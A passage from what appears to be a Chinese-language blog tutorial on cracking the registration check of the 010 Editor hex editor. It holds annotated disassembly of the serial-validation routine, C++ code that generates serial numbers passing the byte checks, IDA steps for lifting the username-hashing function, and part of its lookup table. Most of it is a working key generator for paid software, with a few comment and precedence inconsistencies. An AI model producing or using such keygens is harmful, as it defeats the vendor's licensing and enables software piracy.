ESP,0x4</span><br><span class="line">013BDD38   .  8947 20       MOV DWORD PTR DS:[EDI+0x20],EAX</span><br><span class="line">013BDD3B   .  85C0          TEST EAX,EAX</span><br><span class="line">013BDD3D   .  0F84 32010000 JE 010Edito.013BDE75</span><br><span class="line">013BDD43   .  3D E8030000   CMP EAX,0x3E8</span><br><span class="line">013BDD48   .  0F87 27010000 JA 010Edito.013BDE75</span><br><span class="line">013BDD4E   .  0FB655 E5     MOVZX EDX,BYTE PTR SS:[EBP-0x1B]</span><br><span class="line">013BDD52   .  0FB64D E0     MOVZX ECX,BYTE PTR SS:[EBP-0x20]</span><br><span class="line">013BDD56   .  0FB6C7        MOVZX EAX,BH</span><br><span class="line">013BDD59   .  33D0          XOR EDX,EAX</span><br><span class="line">013BDD5B   .  0FB645 E4     MOVZX EAX,BYTE PTR SS:[EBP-0x1C]</span><br><span class="line">013BDD5F   .  33C8          XOR ECX,EAX</span><br><span class="line">013BDD61   .  C1E2 08       SHL EDX,0x8</span><br><span class="line">013BDD64   .  0FB645 E2     MOVZX EAX,BYTE PTR SS:[EBP-0x1E]</span><br><span class="line">013BDD68   .  03D1          ADD EDX,ECX</span><br><span class="line">013BDD6A   .  0FB64D DC     MOVZX ECX,BYTE PTR SS:[EBP-0x24]</span><br><span class="line">013BDD6E   .  C1E2 08       SHL EDX,0x8</span><br><span class="line">013BDD71   .  33C8          XOR ECX,EAX</span><br><span class="line">013BDD73   .  03D1          ADD EDX,ECX</span><br><span class="line">013BDD75   .  68 278C5B00   PUSH 010Edito.005B8C27</span><br><span class="line">013BDD7A   .  52            PUSH EDX</span><br><span class="line">013BDD7B   .  E8 0BCA04FF   CALL 010Edito.0040A78B</span><br><span class="line">013BDD80   .  83C4 08       ADD ESP,0x8</span><br><span class="line">013BDD83   .  8945 F0       MOV DWORD PTR SS:[EBP-0x10],EAX</span><br><span class="line">013BDD86   .  8947 34       MOV DWORD PTR DS:[EDI+0x34],EAX</span><br><span class="line">013BDD89   .  8BF0          MOV ESI,EAX</span><br><span class="line">013BDD8B   &gt;  8D45 EC       LEA EAX,DWORD PTR SS:[EBP-0x14]</span><br><span class="line">013BDD8E   .  50            PUSH EAX                                 ;  push 一个局部变量的地址</span><br><span class="line">013BDD8F   .  8D4F 04       LEA ECX,DWORD PTR DS:[EDI+0x4]           ;  EDI+4是unicode编码的用户名</span><br><span class="line">013BDD92   .  FF15 782BE702 CALL DWORD PTR DS:[&lt;&amp;Qt5Core.?toUtf8@QSt&gt;;  eax返回的是ascii编码的用户名</span><br><span class="line">013BDD98   .  FF77 20       PUSH DWORD PTR DS:[EDI+0x20]             ;  push 的是一个0空间</span><br><span class="line">013BDD9B   .  33C0          XOR EAX,EAX</span><br><span class="line">013BDD9D   .  C745 FC 00000&gt;MOV DWORD PTR SS:[EBP-0x4],0x0</span><br><span class="line">013BDDA4   .  80FB FC       CMP BL,0xFC</span><br><span class="line">013BDDA7   .  8D4D EC       LEA ECX,DWORD PTR SS:[EBP-0x14]          ;  ascii编码的用户名的对象</span><br><span class="line">013BDDAA   .  56            PUSH ESI                                 ;  0</span><br><span class="line">013BDDAB   .  0F95C0        SETNE AL                                 ;  zf &#x3D; 0时设置al</span><br><span class="line">013BDDAE   .  50            PUSH EAX                                 ;  1</span><br><span class="line">013BDDAF   .  FF15 8C24E702 CALL DWORD PTR DS:[&lt;&amp;Qt5Core.?data@QByte&gt;;  Qt5Core.?data@QByteArray@@QAEPADXZ</span><br><span class="line">013BDDB5   .  50            PUSH EAX                                 ;  eax是call返回的ascii编码的用户名</span><br><span class="line">013BDDB6   .  E8 955004FF   CALL 010Edito.00402E50</span><br><span class="line">013BDDBB   .  8BD0          MOV EDX,EAX                              ;  返回值</span><br><span class="line">013BDDBD   .  83C4 10       ADD ESP,0x10</span><br><span class="line">013BDDC0   .  3855 E0       CMP BYTE PTR SS:[EBP-0x20],DL            ;  cmp K[4],返回值&amp;0xFF</span><br><span class="line">013BDDC3   .  0F85 81000000 JNZ 010Edito.013BDE4A                    ;  字符串处理</span><br><span class="line">013BDDC9   .  8BCA          MOV ECX,EDX                              ;  ecx &#x3D; 返回值</span><br><span class="line">013BDDCB   .  C1E9 08       SHR ECX,0x8                              ;  右移8位</span><br><span class="line">013BDDCE   .  3AF9          CMP BH,CL                                ;  cmp K[4],返回值&gt;&gt;8&amp;0xff</span><br><span class="line">013BDDD0   .  75 78         JNZ SHORT 010Edito.013BDE4A</span><br><span class="line">013BDDD2   .  8BCA          MOV ECX,EDX                              ;  ecx &#x3D; 返回值</span><br><span class="line">013BDDD4   .  C1E9 10       SHR ECX,0x10                             ;  右移16位</span><br><span class="line">013BDDD7   .  384D E2       CMP BYTE PTR SS:[EBP-0x1E],CL            ;  cmp K[6],返回值&gt;&gt;16&amp;0xff</span><br><span class="line">013BDDDA   .  75 6E         JNZ SHORT 010Edito.013BDE4A</span><br><span class="line">013BDDDC   .  C1E8 18       SHR EAX,0x18                             ;  右移24位</span><br><span class="line">013BDDDF   .  3845 E3       CMP BYTE PTR SS:[EBP-0x1D],AL            ;  cmp K[7],返回值&gt;&gt;24&amp;0xff</span><br><span class="line">013BDDE2   .  75 66         JNZ SHORT 010Edito.013BDE4A</span><br><span class="line">013BDDE4   .  80FB 9C       CMP BL,0x9C                              ;  cmp K[3],9C</span><br><span class="line">013BDDE7   .  75 0F         JNZ SHORT 010Edito.013BDDF8</span><br><span class="line">013BDDE9   .  8B45 08       MOV EAX,DWORD PTR SS:[EBP+0x8]           ;  Case 9C of switch 013BDDE4</span><br><span class="line">013BDDEC   .  3B47 1C       CMP EAX,DWORD PTR DS:[EDI+0x1C] ; 比较的具体条件看当时的EBP+0x8，EDI+0x1C</span><br><span class="line">013BDDEF   .  76 52         JBE SHORT 010Edito.013BDE43 ;这个跳转成功，返回的就是是2D，可以看到跳转地址</span><br><span class="line">013BDDF1   .  BE 4E000000   MOV ESI,0x4E</span><br><span class="line">013BDDF6   .  EB 57         JMP SHORT 010Edito.013BDE4F</span><br><span class="line">013BDDF8   &gt;  80FB FC       CMP BL,0xFC</span><br><span class="line">013BDDFB   .  75 2E         JNZ SHORT 010Edito.013BDE2B</span><br><span class="line">013BDDFD   .  0FB64D DE     MOVZX ECX,BYTE PTR SS:[EBP-0x22]         ;  Case FC of switch 013BDDE4</span><br><span class="line">013BDE01   .  0FB645 DD     MOVZX EAX,BYTE PTR SS:[EBP-0x23]</span><br><span class="line">013BDE05   .  C1E1 08       SHL ECX,0x8</span><br><span class="line">013BDE08   .  03C8          ADD ECX,EAX</span><br><span class="line">013BDE0A   .  0FB645 DC     MOVZX EAX,BYTE PTR SS:[EBP-0x24]</span><br><span class="line">013BDE0E   .  C1E1 08       SHL ECX,0x8</span><br><span class="line">013BDE11   .  52            PUSH EDX</span><br><span class="line">013BDE12   .  03C8          ADD ECX,EAX</span><br><span class="line">013BDE14   .  51            PUSH ECX</span><br><span class="line">013BDE15   .  E8 71C904FF   CALL 010Edito.0040A78B</span><br><span class="line">013BDE1A   .  83C4 08       ADD ESP,0x8</span><br><span class="line">013BDE1D   .  85C0          TEST EAX,EAX</span><br><span class="line">013BDE1F   .  74 29         JE SHORT 010Edito.013BDE4A</span><br><span class="line">013BDE21   .  8947 18       MOV DWORD PTR DS:[EDI+0x18],EAX</span><br><span class="line">013BDE24   .  BE 93000000   MOV ESI,0x93</span><br><span class="line">013BDE29   .  EB 24         JMP SHORT 010Edito.013BDE4F</span><br><span class="line">013BDE2B   &gt;  80FB AC       CMP BL,0xAC</span><br><span class="line">013BDE2E   .  75 1A         JNZ SHORT 010Edito.013BDE4A</span><br><span class="line">013BDE30   .  8B45 F0       MOV EAX,DWORD PTR SS:[EBP-0x10]          ;  Case AC of switch 013BDDE4</span><br><span class="line">013BDE33   .  85C0          TEST EAX,EAX</span><br><span class="line">013BDE35   .  74 13         JE SHORT 010Edito.013BDE4A</span><br><span class="line">013BDE37   .  3945 0C       CMP DWORD PTR SS:[EBP+0xC],EAX</span><br><span class="line">013BDE3A   .  76 07         JBE SHORT 010Edito.013BDE43</span><br><span class="line">013BDE3C   .  BE 4E000000   MOV ESI,0x4E</span><br><span class="line">013BDE41   .  EB 0C         JMP SHORT 010Edito.013BDE4F</span><br><span class="line">013BDE43   &gt;  BE 2D000000   MOV ESI,0x2D</span><br><span class="line">013BDE48   .  EB 05         JMP SHORT 010Edito.013BDE4F</span><br><span class="line">013BDE4A   &gt;  BE E7000000   MOV ESI,0xE7                             ;  Default case of switch 013BDDE4</span><br><span class="line">013BDE4F   &gt;  8D4D EC       LEA ECX,DWORD PTR SS:[EBP-0x14]</span><br><span class="line">013BDE52   .  C745 FC FFFFF&gt;MOV DWORD PTR SS:[EBP-0x4],-0x1</span><br><span class="line">013BDE59   .  FF15 7C24E702 CALL DWORD PTR DS:[&lt;&amp;Qt5Core.??1QByteArr&gt;;  Qt5Core.??1QByteArray@@QAE@XZ</span><br><span class="line">013BDE5F   .  8BC6          MOV EAX,ESI</span><br><span class="line">013BDE61   .  8B4D F4       MOV ECX,DWORD PTR SS:[EBP-0xC]</span><br><span class="line">013BDE64   .  64:890D 00000&gt;MOV DWORD PTR FS:[0],ECX</span><br><span class="line">013BDE6B   .  59            POP ECX</span><br><span class="line">013BDE6C   .  5F            POP EDI</span><br><span class="line">013BDE6D   .  5E            POP ESI</span><br><span class="line">013BDE6E   .  5B            POP EBX</span><br><span class="line">013BDE6F   .  8BE5          MOV ESP,EBP</span><br><span class="line">013BDE71   .  5D            POP EBP</span><br><span class="line">013BDE72   .  C2 0800       RETN 0x8</span><br><span class="line">013BDE75   &gt;  B8 E7000000   MOV EAX,0xE7                             ;  Default case of switch 013BDC63</span><br><span class="line">013BDE7A   .  8B4D F4       MOV ECX,DWORD PTR SS:[EBP-0xC]</span><br><span class="line">013BDE7D   .  64:890D 00000&gt;MOV DWORD PTR FS:[0],ECX</span><br><span class="line">013BDE84   .  59            POP ECX</span><br><span class="line">013BDE85   .  5F            POP EDI</span><br><span class="line">013BDE86   .  5E            POP ESI</span><br><span class="line">013BDE87   .  5B            POP EBX</span><br><span class="line">013BDE88   .  8BE5          MOV ESP,EBP</span><br><span class="line">013BDE8A   .  5D            POP EBP</span><br><span class="line">013BDE8B   .  C2 0800       RETN 0x8</span><br><span class="line">013BDE8E   &gt;  B8 93000000   MOV EAX,0x93</span><br><span class="line">013BDE93   .  8B4D F4       MOV ECX,DWORD PTR SS:[EBP-0xC]</span><br><span class="line">013BDE96   .  64:890D 00000&gt;MOV DWORD PTR FS:[0],ECX</span><br><span class="line">013BDE9D   .  59            POP ECX</span><br><span class="line">013BDE9E   .  5F            POP EDI</span><br><span class="line">013BDE9F   .  5E            POP ESI</span><br><span class="line">013BDEA0   .  5B            POP EBX</span><br><span class="line">013BDEA1   .  8BE5          MOV ESP,EBP</span><br><span class="line">013BDEA3   .  5D            POP EBP</span><br><span class="line">013BDEA4   .  C2 0800       RETN 0x8</span><br></pre></td></tr></table></figure><h3 id="关键部分"><a href="#关键部分" class="headerlink" title="关键部分"></a>关键部分</h3><h4 id="序列号（字节）之间的关系"><a href="#序列号（字节）之间的关系" class="headerlink" title="序列号（字节）之间的关系"></a>序列号（字节）之间的关系</h4><img src="010Editor的逆向/mainhanshu.png" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><p>把这两个函数带入参数分别解析（K是输入的（密码/序列号）K[0]代表第一个字节，例如：112233445566778899AA，K[0]就等于 11）</p><p>函数1 （00407644）参数（K[0],^K[6]）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">013BD0B0  &#x2F;&gt; \55            PUSH EBP</span><br><span class="line">013BD0B1  |.  8BEC          MOV EBP,ESP</span><br><span class="line">013BD0B3  |.  8B45 08       MOV EAX,[ARG.1]                          ;  EAX &#x3D; K[0]^K[6]</span><br><span class="line">013BD0B6  |.  34 18         XOR AL,0x18                              ;  AL &#x3D; (K[0]^K[6])^0x18</span><br><span class="line">013BD0B8  |.  04 3D         ADD AL,0x3D                              ;  AL &#x3D; ((K[0]^K[6])^0x18)+0x3D</span><br><span class="line">013BD0BA  |.  34 A7         XOR AL,0xA7                              ;  AL &#x3D; (((K[0]^K[6])^0x18)+0x3D)^0xA7</span><br><span class="line">013BD0BC  |.  5D            POP EBP</span><br><span class="line">013BD0BD  \.  C3            RETN</span><br></pre></td></tr></table></figure><p>函数2 （004083C8）参数 （ ((K[1]^K[6]) &amp; 0xFF) * 0x100) + (K[2]^K[5] &amp; 0xFF)&amp;0xFFFF）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">013BD020  &#x2F;&gt; \55            PUSH EBP</span><br><span class="line">013BD021  |.  8BEC          MOV EBP,ESP</span><br><span class="line">013BD023  |.  8B45 08       MOV EAX,[ARG.1]                          ;  EAX &#x3D; (0x100*(K[1]^K[7]&amp;0xFF)+K[2]^K[5]&amp;0xFF)&amp;0xFFFF</span><br><span class="line">013BD026  |.  B9 0B000000   MOV ECX,0xB                              ;  ECX &#x3D; 0xB</span><br><span class="line">013BD02B  |.  35 92780000   XOR EAX,0x7892                           ;  EAX &#x3D; (EAX)^0x7892</span><br><span class="line">013BD030  |.  05 304D0000   ADD EAX,0x4D30                           ;  EAX &#x3D; (EAX)^0x7892 + 0x4D30</span><br><span class="line">013BD035  |.  35 21340000   XOR EAX,0x3421                           ;  EAX &#x3D; ((EAX)^0x7892 + 0x4D30) ^ 0x3421</span><br><span class="line">013BD03A  |.  0FB7C0        MOVZX EAX,AX                             ;  EAX &#x3D; (((EAX)^0x7892 + 0x4D30) ^ 0x3421) &amp; 0xFFFF</span><br><span class="line">013BD03D  |.  99            CDQ                                      ;  清除EDX</span><br><span class="line">013BD03E  |.  F7F9          IDIV ECX                                 ;  EAX &#x2F; ECX (商放eax，余数放edx)</span><br><span class="line">013BD040  |.  85D2          TEST EDX,EDX</span><br><span class="line">013BD042  |.  74 02         JE SHORT 010Edito.013BD046               ;  余数等于0 直接退出并返回商 ，余数不为0则返回0</span><br><span class="line">013BD044  |.  33C0          XOR EAX,EAX</span><br><span class="line">013BD046  |&gt;  5D            POP EBP</span><br><span class="line">013BD047  \.  C3            RETN</span><br></pre></td></tr></table></figure><h5 id="代码转换"><a href="#代码转换" class="headerlink" title="代码转换"></a>代码转换</h5><p>根据以上信息，可以通过c++代码运算得到序列号</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//013BDDE4   .  80FB 9C       CMP BL,0x9C                              ;  cmp K[3],9C</span></span><br><span class="line">    byte K[] = &#123; <span class="number">11</span>,<span class="number">22</span>,<span class="number">33</span>,<span class="number">0x9C</span>,<span class="number">55</span>,<span class="number">66</span>,<span class="number">77</span>,<span class="number">88</span>,<span class="number">99</span>,<span class="number">0xAA</span> &#125;;</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//AL = (K[0]^K[6]^0x18+0x3D)^0xA7</span></span><br><span class="line">byte K0 = rand() % <span class="number">0xFF</span>;</span><br><span class="line">byte K6 = rand() % <span class="number">0xFF</span>;</span><br><span class="line">byte AL = (K0 ^ K6 ^ <span class="number">0x18</span> + <span class="number">0x3D</span>) ^ <span class="number">0xA7</span>;</span><br><span class="line"><span class="keyword">if</span> (AL &gt; <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">K[<span class="number">0</span>] = K0;</span><br><span class="line">            K[<span class="number">6</span>] = K6;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">&#123;</span><br><span class="line">byte K1 = rand() % <span class="number">0xFF</span>;</span><br><span class="line">byte K2 = rand() % <span class="number">0xFF</span>;</span><br><span class="line">byte K5 = rand() % <span class="number">0xFF</span>;</span><br><span class="line">byte K7 = rand() % <span class="number">0xFF</span>;</span><br><span class="line"><span class="comment">//DWORD ESI = (((K1 ^ K7) &amp; 0xFF) * 0x100) + ((K2 ^ K5 &amp; 0xFF) &amp; 0xFFFF);</span></span><br><span class="line">DWORD ESI = ((K1 ^ K7 &amp; <span class="number">0xFF</span>) * <span class="number">0x100</span>) + ((K2 ^ K5) &amp; <span class="number">0xFF</span>) &amp; <span class="number">0xFFFF</span>;</span><br><span class="line"><span class="comment">//DWORD EAX = (((ESI ^ 0x7892) + 0x4D30) ^ 0x3421) &amp; 0xFFFF;</span></span><br><span class="line">DWORD EAX = (((ESI ^ <span class="number">0x7892</span>) + <span class="number">0x4D30</span>) ^ <span class="number">0x3421</span>) &amp; <span class="number">0xFFFF</span>;</span><br><span class="line"><span class="comment">//余数等于0 直接退出并返回商 ，余数不为0则返回0</span></span><br><span class="line"><span class="comment">//EAX &lt;= 0x3E8</span></span><br><span class="line"><span class="keyword">if</span> (EAX % <span class="number">0xB</span> == <span class="number">0</span> &amp;&amp; EAX / <span class="number">0xB</span> &lt;= <span class="number">0x3E8</span>)</span><br><span class="line">&#123;</span><br><span class="line">K[<span class="number">1</span>] = K1;</span><br><span class="line">K[<span class="number">2</span>] = K2;</span><br><span class="line">K[<span class="number">5</span>] = K5;</span><br><span class="line">K[<span class="number">7</span>] = K7;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> index = <span class="number">0</span>; index &lt; <span class="keyword">sizeof</span>(K); index++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%02X&quot;</span>,K[index]);</span><br><span class="line"><span class="keyword">if</span> (index % <span class="number">2</span> != <span class="number">0</span> &amp;&amp; index != <span class="keyword">sizeof</span>(K)<span class="number">-1</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;-&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据以上代码算出来的序列号（序列号字节之间的对应关系）没有问题，但是下面还要分析与账户之间的对应关系</p><h4 id="账户与序列号之间的关系"><a href="#账户与序列号之间的关系" class="headerlink" title="账户与序列号之间的关系"></a>账户与序列号之间的关系</h4><img src="010Editor的逆向/UserAndPasswd.png" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">013BDD98   .  FF77 20       PUSH DWORD PTR DS:[EDI+0x20]             ;  返回值（商）,第四个参数</span><br><span class="line">013BDD9B   .  33C0          XOR EAX,EAX</span><br><span class="line">013BDD9D   .  C745 FC 00000&gt;MOV DWORD PTR SS:[EBP-0x4],0x0</span><br><span class="line">013BDDA4   .  80FB FC       CMP BL,0xFC</span><br><span class="line">013BDDA7   .  8D4D EC       LEA ECX,DWORD PTR SS:[EBP-0x14]          ;  ascii编码的用户名的对象</span><br><span class="line">013BDDAA   .  56            PUSH ESI                                 ;  0  ，第三个参数</span><br><span class="line">013BDDAB   .  0F95C0        SETNE AL                                 ;  zf &#x3D; 0时设置al</span><br><span class="line">013BDDAE   .  50            PUSH EAX                                 ;  1  ，第二个参数</span><br><span class="line">013BDDAF   .  FF15 8C24E702 CALL DWORD PTR DS:[&lt;&amp;Qt5Core.?data@QByte&gt;;  Qt5Core.?data@QByteArray@@QAEPADXZ</span><br><span class="line">013BDDB5   .  50            PUSH EAX                                 ;  eax是call返回的ascii编码的用户名，第一个参数</span><br><span class="line">013BDDB6   .  E8 955004FF   CALL 010Edito.00402E50                   ;  这个是用户名的加密，看多了会掉头发</span><br></pre></td></tr></table></figure><h5 id="使用加密代码"><a href="#使用加密代码" class="headerlink" title="使用加密代码"></a>使用加密代码</h5><p>这里地方要转换成c++代码稍微有点麻烦，因为有一个加密，这里我直接用IDA打开，用IDA分析这个加密函数，然后直接拿过来用</p><p>注：如果要通过IDA找到该函数的地址需要经过地址转换，随意这里最好使用默认基址（把重定位标志去掉），而且使用IDA打开010Editor，需要几分钟时间，需要耐心等待</p><p>完全打开的状态：左下角那串字符不在动了</p><h5 id="IDA打开"><a href="#IDA打开" class="headerlink" title="IDA打开"></a>IDA打开</h5><img src="010Editor的逆向/IDAOpen1.png" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><p>或者是这个样子</p><img src="010Editor的逆向/IDAOpen2.png" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><p>也可能是这个样子</p><img src="010Editor的逆向/IDAOpen3.png" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><p>这种状态可通过空格键（Space）切换</p><p>013BDDB6   .  E8 955004FF   CALL 010Edito.00402E50                   ;  这个是用户名的加密，看多了会掉头发</p><p>函数调用地址 013BDDB6   在IDA界面按G搜索</p><img src="010Editor的逆向/FindG.png" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><p>点击OK后</p><img src="010Editor的逆向/FindGNext.png" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><p>双击进入后</p><img src="010Editor的逆向/FindGNext2.png" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><p>再次双击后，会看到如下界面</p><img src="010Editor的逆向/MainKey.png" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><p>然后直接按F5，会看到它被解析成C++代码</p><img src="010Editor的逆向/MainKeyF5.png" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><p>这个是后看一下，这个函数的代码是不是可以直接拿过来用</p><p>当往下看的时候，发现有一个四字节的数组操作</p><h5 id="找数组元素"><a href="#找数组元素" class="headerlink" title="找数组元素"></a>找数组元素</h5><img src="010Editor的逆向/MainArr1.png" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><p>这个时候需要找到这个数组的，双击数组地址进入</p><img src="010Editor的逆向/MainArr2.png" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><p>可以看到这个数组在data段，地址是02E6418，这个时候可以通过OD找到这个数组的定义（元素）</p><img src="010Editor的逆向/MainArr3.png" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><p>找到的数组元素</p><img src="010Editor的逆向/MainArr4.png" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><p>把它复制出来（这里用到一个插件”数据转换“）</p><img src="010Editor的逆向/MainArr5.png" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><p>复制出来的元素</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="number">0x39cb44b8</span>, <span class="number">0x23754f67</span>, <span class="number">0x5f017211</span>, <span class="number">0x3ebb24da</span>, <span class="number">0x351707c6</span>, <span class="number">0x63f9774b</span>, <span class="number">0x17827288</span>, <span class="number">0x0fe74821</span>, <span class="number">0x5b5f670f</span>, <span class="number">0x48315ae8</span>, <span class="number">0x785b7769</span>, <span class="number">0x2b7a1547</span>, <span class="number">0x38d11292</span>, <span class="number">0x42a11b32</span>, <span class="number">0x35332244</span>, <span class="number">0x77437b60</span>,</span><br><span class="line"><span class="number">0x1eab3b10</span>, <span class="number">0x53810000</span>, <span class="number">0x1d0212ae</span>, <span class="number">0x6f0377a8</span>, <span class="number">0x43c03092</span>, <span class="number">0x2d3c0a8e</span>, <span class="number">0x62950cbf</span>, <span class="number">0x30f06ffa</span>, <span class="number">0x34f710e0</span>, <span class="number">0x28f417fb</span>, <span class="number">0x350d2f95</span>, <span class="number">0x5a361d5a</span>, <span class="number">0x15cc060b</span>, <span class="number">0x0afd13cc</span>, <span class="number">0x28603bcf</span>, <span class="number">0x3371066b</span>,</span><br><span class="line"><span class="number">0x30cd14e4</span>, <span class="number">0x175d3a67</span>, <span class="number">0x6dd66a13</span>, <span class="number">0x2d3409f9</span>, <span class="number">0x581e7b82</span>, <span class="number">0x76526b99</span>, <span class="number">0x5c8d5188</span>, <span class="number">0x2c857971</span>, <span class="number">0x15f51fc0</span>, <span class="number">0x68cc0d11</span>, <span class="number">0x49f55e5c</span>, <span class="number">0x275e4364</span>, <span class="number">0x2d1e0dbc</span>, <span class="number">0x4cee7ce3</span>, <span class="number">0x32555840</span>, <span class="number">0x112e2e08</span>,</span><br><span class="line"><span class="number">0x6978065a</span>, <span class="number">0x72921406</span>, <span class="number">0x314578e7</span>, <span class="number">0x175621b7</span>, <span class="number">0x40771dbf</span>, <span class="number">0x3fc238d6</span>, <span class="number">0x4a31128a</span>, <span class="number">0x2dad036e</span>, <span class="number">0x41a069d6</span>, <span class="number">0x25400192</span>, <span class="number">0x00dd4667</span>, <span class="number">0x6afc1f4f</span>, <span class="number">0x571040ce</span>, <span class="number">0x62fe66df</span>, <span class="number">0x41db4b3e</span>, <span class="number">0x3582231f</span>,</span><br><span class="line"><span class="number">0x55f6079a</span>, <span class="number">0x1ca70644</span>, <span class="number">0x1b1643d2</span>, <span class="number">0x3f7228c9</span>, <span class="number">0x5f141070</span>, <span class="number">0x3e1474ab</span>, <span class="number">0x444b256e</span>, <span class="number">0x537050d9</span>, <span class="number">0x0f42094b</span>, <span class="number">0x2fd820e6</span>, <span class="number">0x778b2e5e</span>, <span class="number">0x71176d02</span>, <span class="number">0x7fea7a69</span>, <span class="number">0x5bb54628</span>, <span class="number">0x19ba6c71</span>, <span class="number">0x39763a99</span>,</span><br><span class="line"><span class="number">0x178d54cd</span>, <span class="number">0x01246e88</span>, <span class="number">0x3313537e</span>, <span class="number">0x2b8e2d17</span>, <span class="number">0x2a3d10be</span>, <span class="number">0x59d10582</span>, <span class="number">0x37a163db</span>, <span class="number">0x30d6489a</span>, <span class="number">0x6a215c46</span>, <span class="number">0x0e1c7a76</span>, <span class="number">0x1fc760e7</span>, <span class="number">0x79b80c65</span>, <span class="number">0x27f459b4</span>, <span class="number">0x799a7326</span>, <span class="number">0x50ba1782</span>, <span class="number">0x2a116d5c</span>,</span><br><span class="line"><span class="number">0x63866e1b</span>, <span class="number">0x3f920e3c</span>, <span class="number">0x55023490</span>, <span class="number">0x55b56089</span>, <span class="number">0x2c391fd1</span>, <span class="number">0x2f8035c2</span>, <span class="number">0x64fd2b7a</span>, <span class="number">0x4ce8759a</span>, <span class="number">0x518504f0</span>, <span class="number">0x799501a8</span>, <span class="number">0x3f5b2cad</span>, <span class="number">0x38e60160</span>, <span class="number">0x637641d8</span>, <span class="number">0x33352a42</span>, <span class="number">0x51a22c19</span>, <span class="number">0x085c5851</span>,</span><br><span class="line"><span class="number">0x032917ab</span>, <span class="number">0x2b770ac7</span>, <span class="number">0x30ac77b3</span>, <span class="number">0x2bec1907</span>, <span class="number">0x035202d0</span>, <span class="number">0x0fa933d3</span>, <span class="number">0x61255df3</span>, <span class="number">0x22ad06bf</span>, <span class="number">0x58b86971</span>, <span class="number">0x5fca0de5</span>, <span class="number">0x700d6456</span>, <span class="number">0x56a973db</span>, <span class="number">0x5ab759fd</span>, <span class="number">0x330e0be2</span>, <span class="number">0x5b3c0ddd</span>, <span class="number">0x495d3c60</span>,</span><br><span class="line"><span class="number">0x53bd59a6</span>, <span class="number">0x4c5e6d91</span>, <span class="number">0x49d9318d</span>, <span class="number">0x103d5079</span>, <span class="number">0x61ce42e3</span>, <span class="number">0x7ed5121d</span>, <span class="number">0x14e160ed</span>, <span class="number">0x212d4ef2</span>, <span class="number">0x270133f0</span>, <span class="number">0x62435a96</span>, <span 